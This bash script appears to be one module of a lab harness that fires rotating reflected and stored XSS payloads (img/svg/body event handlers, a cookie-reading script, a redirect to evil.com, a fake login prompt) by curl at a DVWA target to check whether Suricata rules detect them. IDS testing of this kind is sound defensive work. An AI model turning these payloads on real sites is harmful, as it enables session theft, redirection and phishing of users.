#!/bin/bash

# =================================================================
# MODULE 05: CROSS-SITE SCRIPTING (XSS) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Reflected, Obfuscated, Stored/POST)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
# Insert the PHPSESSID from your DVWA login (same as the SQLMap module)
COOKIE="security=low; PHPSESSID=replace_with_your_session_id"
LOG_FILE="logs/xss_session_$(date +%F).log"

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the HTML tag (Level 2) and stored payload (Level 3)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Level 2: Image OnError (Standard Evasion)
    PAYLOAD_RAW_L2="<img src=x onerror=alert(1)>"
    PAYLOAD_ENC_L2="%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    DESC_L2="Evasion: IMG Tag OnError"
    
    # Level 3: Stored Cookie Alert
    NAME_L3="HackerA"
    PAYLOAD_RAW_L3="<script>alert(document.cookie)</script>"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Level 2: SVG OnLoad (HTML5 Vector)
    PAYLOAD_RAW_L2="<svg/onload=alert(1)>"
    PAYLOAD_ENC_L2="%3Csvg%2Fonload%3Dalert(1)%3E"
    DESC_L2="Evasion: SVG Tag OnLoad"
    
    # Level 3: Stored Redirect
    NAME_L3="HackerB"
    PAYLOAD_RAW_L3="<script>window.location='http://evil.com'</script>"

else
    # --- SET C (Round 21-30) ---
    # Level 2: Body OnLoad (Context Evasion)
    PAYLOAD_RAW_L2="<body onload=alert(1)>"
    PAYLOAD_ENC_L2="%3Cbody%20onload%3Dalert(1)%3E"
    DESC_L2="Evasion: BODY Tag OnLoad"
    
    # Level 3: Stored Phishing Form
    NAME_L3="HackerC"
    PAYLOAD_RAW_L3="<script>prompt('Please login again')</script>"
fi

echo "[+] [05_XSS] Starting XSS Injection Scenario..."
echo "[+] Target IP: $TARGET_IP"
echo "[+] Mode: Round $ROUND ($DESC_L2)"

# Check cookie
if [[ "$COOKIE" == *"replace_with"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie not set yet! The script may fail to log in to DVWA.${NC}"
   sleep 5
fi

# -----------------------------------------------------------------
# LEVEL 1: REFLECTED XSS (BASIC - BASELINE)
# Goal: Baseline. Test detection of a standard <script> tag in the URL.
# Payload: <script>alert('XSS')</script>
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic Reflected XSS...${NC}"

# Level 1 payload remains fixed (baseline)
PAYLOAD_RAW="<script>alert('XSS')</script>"
PAYLOAD_ENC="%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC"

# DISPLAY REPORT
echo -e "${YELLOW}    [Original Payload]   : $PAYLOAD_RAW${NC}"
echo -e "${YELLOW}    [Sent Payload]      : $PAYLOAD_ENC${NC}"
echo -e "${YELLOW}    [Method]            : HTTP GET${NC}"

# Execute
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl1_r${ROUND}.html
echo "    -> Completed. (Expected: ET WEB_SERVER Script tag in URI alert)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: REFLECTED XSS (EVASION - DYNAMIC)
# Goal: Test rules for tags other than <script>.
# Technique: Use a dynamic payload variable ($PAYLOAD_ENC_L2).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# Level 2 URL uses the dynamic variable
URL="http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=$PAYLOAD_ENC_L2"

# DISPLAY REPORT
echo -e "${YELLOW}    [Original Payload]   : $PAYLOAD_RAW_L2${NC}"
echo -e "${YELLOW}    [Sent Payload]      : $PAYLOAD_ENC_L2${NC}"
echo -e "${YELLOW}    [Technique Info]    : Using a non-standard event handler${NC}"

# Execute
curl -s -b "$COOKIE" "$URL" -o logs/xss_lvl2_r${ROUND}.html
echo "    -> Completed. (Expected: detection via event-handler pattern)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: STORED XSS (POST METHOD - DYNAMIC)
# Goal: Test detection in the HTTP body with varying content.
# Technique: Send the payload via POST to the DVWA guestbook.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Stored XSS via POST (HTTP Body)...${NC}"

URL_STORED="http://$TARGET_IP/dvwa/vulnerabilities/xss_s/"
# Build the POST body using dynamic variables
PAYLOAD_BODY="txtName=$NAME_L3&mtxMessage=$PAYLOAD_RAW_L3&btnSign=Sign+Guestbook"

# DISPLAY REPORT
echo -e "${YELLOW}    [Target URL]        : $URL_STORED${NC}"
echo -e "${YELLOW}    [POST Data Body]    : $PAYLOAD_BODY${NC}"
echo -e "${YELLOW}    [Technique Info]    : Payload embedded in the request body${NC}"

# Execute
curl -s -X POST -b "$COOKIE" -d "$PAYLOAD_BODY" "$URL_STORED" -o logs/xss_lvl3_r${ROUND}.html
echo "    -> Completed. (Expected: Suricata inspects the HTTP request body)"

echo "[+] [05_XSS] Scenario Completed at $(date)"
echo "-----------------------------------------------------------"